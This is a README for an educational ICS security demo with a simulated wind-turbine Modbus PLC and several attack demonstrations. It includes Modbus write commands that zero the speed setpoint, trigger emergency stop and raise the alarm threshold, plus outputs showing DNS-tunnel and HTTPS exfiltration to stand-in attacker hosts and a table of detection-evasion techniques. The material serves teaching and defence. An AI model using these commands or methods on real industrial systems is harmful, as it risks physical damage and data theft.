# Modbus ICS attack demonstration

This project demonstrates basic industrial control system (ICS) security vulnerabilities using a simulated wind 
turbine PLC and Modbus/TCP protocol.

## Disclaimer

This demonstration is for **educational purposes only** to understand ICS security risks. Only use these tools on 
systems you own or have explicit permission to test. Unauthorised access to industrial control systems is illegal and 
dangerous.

## Overview

The project consists of two components:

1. **modbus_turbine_simulator.py** - A simulated wind turbine PLC running a Modbus/TCP server
2. **modbus_shutdown_attack_demo.py** - A client that demonstrates an unauthorised setpoint modification attack

## Prerequisites

```bash
pip install pymodbus==3.11.4
```

## Architecture

The simulator creates a virtual PLC with the following Modbus register map:

| Register Type    | Address | Purpose                     | Initial Value |
|------------------|---------|-----------------------------|---------------|
| Holding Register | 1000    | Speed setpoint (RPM)        | 1500          |
| Holding Register | 1050    | Temperature alarm threshold | 95            |
| Holding Register | 1100    | Emergency stop flag         | 0             |
| Input Register   | 2000    | Current speed (RPM)         | 1498          |
| Input Register   | 2050    | Current temperature (°C)    | 72            |

## Usage

### 1. Start the simulator

In one terminal, start the turbine simulator:

```bash
python3 modbus_turbine_simulator.py
```

You should see:
```
[*] UU P&L Turbine PLC simulator running
[*] Listening on 0.0.0.0:502
```

**Note:** Port 502 is the standard Modbus port and requires root/administrator privileges on most systems. If you get 
a permission error, either:

```bash
sudo python3 modbus_turbine_simulator.py
```

Or modify the code to use a non-privileged port like 5020:

```python
StartTcpServer(context=context, address=("0.0.0.0", 5020))
```

### 2. Run the attack demonstration

In a second terminal, run the attack script:

```bash
python3 modbus_shutdown_attack_demo.py
```

Expected output:
```
[*] Connected to target
Current speed: 1498 RPM
Current setpoint: 1500 RPM
[*] Writing zero to speed setpoint (attack)
[✓] Write succeeded
New setpoint: 0 RPM
```

The attack script demonstrates a common ICS vulnerability:

1. **No Authentication** - The Modbus protocol has no built-in authentication
2. **Unauthorised Write Access** - Anyone who can connect can modify critical setpoints
3. **Physical Impact** - Setting turbine speed to 0 RPM could cause:
   - Emergency shutdown
   - Mechanical stress from rapid deceleration
   - Loss of power generation
   - Potential equipment damage

## Real-world context

This simple attack represents actual vulnerabilities found in industrial systems:

- **Stuxnet (2010)** - Modified PLC code to damage Iranian centrifuges
- **Ukraine Power Grid (2015)** - Attackers remotely opened circuit breakers
- **TRITON/TRISIS (2017)** - Targeted safety systems at a petrochemical plant

## Security mitigations

To protect against these attacks, industrial facilities should:

1. **Network segmentation** - Isolate ICS networks from IT networks and the internet
2. **Firewall rules** - Only allow specific IPs to access Modbus devices
3. **VPN/Authentication** - Use encrypted tunnels and authentication layers
4. **Monitoring** - Log all Modbus traffic and alert on unexpected writes
5. **Physical security** - Secure access to control rooms and network equipment
6. **Read-Only access** - Where possible, restrict devices to read-only operations

## 3. Run the data exfiltration demo

```bash
python3 ics_data_exfiltration_demo.py
```

Expected output (IF the simulator is running):

```
======================================================================
[*] Proof of Concept: Unauthorised Turbine Configuration Access
[*] This is a READ-ONLY demonstration
======================================================================

[*] Reading configuration from Turbine 1 (Demo) (127.0.0.1)...
    Speed Setpoint: 1500 RPM
    Current Speed: 1498 RPM
    Temperature Alarm: 95°C
    Current Temperature: 72°C
    E-Stop Active: False
    Temperature Safety Margin: 23°C

[*] ==================================================================
[*] Results saved to poc_turbine_read_20251215_143022.json
[*] No modifications were made to any systems
[*] This demonstrates read-only reconnaissance capability
[*] ==================================================================

[*] IMPACT SUMMARY:
----------------------------------------------------------------------
    An attacker with this access could:
    • Monitor real-time operational state
    • Map system architecture and register layout
    • Identify safety thresholds to stay below during attacks
    • Collect baseline data for anomaly detection evasion
    • Plan precisely-timed manipulation attacks
    • Steal proprietary operational parameters
```

And the generated JSON file:

```
{
  "timestamp": "2025-12-15T14:30:22.145678",
  "demonstration": "read_only_turbine_access",
  "turbines_scanned": 1,
  "successful_reads": 1,
  "turbines": {
    "Turbine 1 (Demo)": {
      "speed_setpoint_rpm": 1500,
      "temp_alarm_threshold_c": 95,
      "emergency_stop_active": false,
      "current_speed_rpm": 1498,
      "current_temperature_c": 72
    }
  },
  "impact_assessment": {
    "data_exposure": [
      "Operational setpoints and safety thresholds exposed",
      "Real-time operational state visible to unauthorized parties",
      "Safety margins and alarm thresholds revealed",
      "System architecture and register mapping discovered"
    ],
    "attack_enablement": [
      "Attacker could monitor operational states in real-time",
      "Configuration data reveals safety margins and operational limits",
      "Historical data collection could reveal production schedules",
      "Information enables planning of precise manipulation attacks",
      "Baseline establishment allows detection of anomalies attackers create"
    ],
    "business_impact": [
      "Intellectual property theft (operational parameters)",
      "Competitive intelligence (production efficiency)",
      "Safety information leakage enables targeted attacks",
      "Regulatory compliance violations (unauthorized access)"
    ]
  }
}
```

If the simulator is NOT running, you'll see:

```
======================================================================
[*] Proof of Concept: Unauthorised Turbine Configuration Access
[*] This is a READ-ONLY demonstration
======================================================================

[*] Reading configuration from Turbine 1 (Demo) (127.0.0.1)...
    [!] Failed to connect to 127.0.0.1
    [!] Could not read from Turbine 1 (Demo)

[!] No turbines were accessible. Ensure the simulator is running:
    python3 turbine_simulator.py
```

### 4. Run historian exfiltration demo

```bash
python3 historian_exfiltration.py
```

Expected output (when no database is available):

```
======================================================================
[*] Proof of Concept: Historian Data Exfiltration
[*] READ-ONLY demonstration - no operational impact
======================================================================

[*] Connecting to historian at 192.168.3.10...
[*] Querying last 365 days of data...
[!] Database connection failed: [IM002] [Microsoft][ODBC Driver Manager] Data source name not found and no default driver specified
[!] This is expected if no historian database is available

[*] In a real scenario, this would extract:
    • Years of production data
    • Efficiency metrics and trends
    • Maintenance and downtime records
    • Alarm histories and patterns
    • Operational setpoint changes over time
```

If database was available:

```
======================================================================
[*] Proof of Concept: Historian Data Exfiltration
[*] READ-ONLY demonstration - no operational impact
======================================================================

[*] Connecting to historian at 192.168.3.10...
[*] Querying last 365 days of data...
[*] Extracted 876543 records
[*] Data saved to exfiltrated_production_data_20251215_143500.csv

[*] VALUE OF THIS DATA:
    - Reveals production capacity and efficiency
    - Identifies operational patterns and schedules
    - Shows improvement trends over time
    - Competitive intelligence worth €€€ to rivals
    - Historical baselines enable stealthy manipulation
    - Maintenance schedules reveal vulnerability windows
```

### 5. Run PLC ladder logic extraction demo

```bash
python3 plc_logic_extraction.py
```

Expected output (without real PLC):
```
======================================================================
[*] Proof of Concept: PLC Ladder Logic Extraction
[*] Demonstrates intellectual property theft capability
======================================================================

[*] Connecting to Allen-Bradley PLC at 192.168.10.10...
[!] Connection failed: [Errno 111] Connection refused

[*] Note: This PoC requires an actual Allen-Bradley PLC
[*] pycomm3 works with CompactLogix, ControlLogix PLCs

[*] In a real scenario, this extraction would provide:
    • Complete ladder logic programs (.L5K/.ACD files)
    • All process control algorithms
    • Safety interlock logic
    • HMI tag mappings
    • Network configuration
    • User-defined function blocks

[*] Tools used in real attacks:
    • RSLogix 5000 / Studio 5000 (legitimate tools)
    • pycomm3 (Python library for AB PLCs)
    • Custom protocol reverse engineering
    • Network traffic capture and replay

======================================================================
[*] EXAMPLE: What Attackers Learn from Ladder Logic
======================================================================

[*] Safety Interlocks Discovered:
    • Emergency stop circuit on input I:1/0
    • Temperature > 95C triggers shutdown
    • Pressure relief valve opens at 150 PSI
    • Redundant safety logic requires 2-of-3 sensor agreement

[*] Proprietary Process Parameters:
    • Proprietary mixing algorithm with 7-stage process
    • Temperature ramp rate: 2.5°C/min for optimal yield
    • Pressure hold time: 45 seconds at each stage
    • Custom PID tuning parameters (Kp=1.2, Ki=0.8, Kd=0.3)

[*] Attack Vectors Identified:
    • Safety logic can be bypassed via register 1100
    • Alarm thresholds stored in unprotected memory
    • No authentication on remote I/O modules
    • Watchdog timer can be disabled via bit B3:0/5

======================================================================
```

### 6. Run demo on slow exfiltration via DNS queries

```bash
python3 covert_exfiltration.py
```

Expected output:

```
======================================================================
[*] Proof of Concept: Covert Data Exfiltration
[*] Demonstrates techniques to evade detection
======================================================================

[*] Sample data to exfiltrate:
    Type: Production records
    Size: 281 bytes
    Value: Trade secrets, competitive intelligence

----------------------------------------------------------------------
[*] METHOD 1: DNS Tunneling
----------------------------------------------------------------------
[*] DNS Exfiltration to exfil.attacker.com
[*] Data size: 200 bytes
[*] Sending 5 DNS queries...
    Sent 5/5 queries
[*] DNS exfiltration complete
[*] Detection evasion: Appears as normal DNS lookups

----------------------------------------------------------------------
[*] METHOD 2: HTTPS Upload
----------------------------------------------------------------------
[*] HTTPS Exfiltration to https://legit-looking-domain.com/api/upload
[*] Data size: 281 bytes
[*] Upload simulated (server not reachable)
[*] In real attack, data would be uploaded via HTTPS
[*] Detection evasion: Encrypted, looks like normal web traffic

----------------------------------------------------------------------
[*] METHOD 3: Time-Based Rate Limiting
----------------------------------------------------------------------
[*] Slow Exfiltration (Rate-limited)
[*] Total data size: 1000 bytes (0.98 KB)
[*] Rate limit: 100 KB/hour
[*] Will send 1 chunks
[*] Estimated time: 1 hours (0.0 days)
[*] Detection probability: LOW (spread over time)

[*] Simulating first 3 chunks...
    [2025-12-15 14:45:23] Chunk 1/1: 1000 bytes

[*] Slow exfiltration initiated
[*] Detection evasion: Traffic blends with normal activity

[*] For 10 MB dataset:
    Time required: 102 hours (4.3 days)
    Detection risk: Minimal (blends with background)

======================================================================
[*] DETECTION EVASION TECHNIQUES SUMMARY
======================================================================

Method               Stealth      Speed        Evasion Technique
----------------------------------------------------------------------
DNS Tunneling        HIGH         SLOW         Appears as normal DNS lookups
HTTPS Upload         MEDIUM       FAST         Encrypted, blends with web traffic
Rate-Limited         VERY HIGH    VERY SLOW    Small periodic transfers avoid DLP triggers
ICMP Tunneling       HIGH         SLOW         Hidden in ping packets (not implemented)
Steganography        VERY HIGH    MEDIUM       Hidden in image files (not implemented)

[*] DEFENSIVE COUNTERMEASURES:
    • Monitor DNS query volumes and patterns
    • Inspect HTTPS traffic via SSL/TLS interception
    • Implement data loss prevention (DLP) systems
    • Baseline normal traffic patterns
    • Monitor for slow, persistent outbound connections
    • Restrict outbound connections to approved destinations

======================================================================
```

## Additional experiments

### Read-only monitoring

Create a monitoring script that only reads values:

```python
while True:
    speed = client.read_input_registers(2000, 1)
    temp = client.read_input_registers(2050, 1)
    print(f"Speed: {speed.registers[0]} RPM, Temp: {temp.registers[0]}°C")
    time.sleep(1)
```

### Emergency stop attack

Modify the attack to trigger emergency stop:

```python
client.write_register(address=1100, value=1)
```

### Temperature alarm manipulation

Change the alarm threshold to mask dangerous conditions:

```python
client.write_register(address=1050, value=200)  # Raise alarm threshold
```

## Testing network security

To test network-level protections:

1. Run simulator on one machine
2. Run attack from another machine on the network
3. Implement firewall rules to block unauthorised access
4. Verify that legitimate monitoring still works

## Learning Resources

- **ICS-CERT Advisories**: https://www.cisa.gov/ics
- **Modbus Protocol Spec**: https://modbus.org/specs.php
- **NIST ICS Security Guide**: https://csrc.nist.gov/publications/detail/sp/800-82/rev-2/final

## License

This educational demonstration is provided as-is for learning purposes only.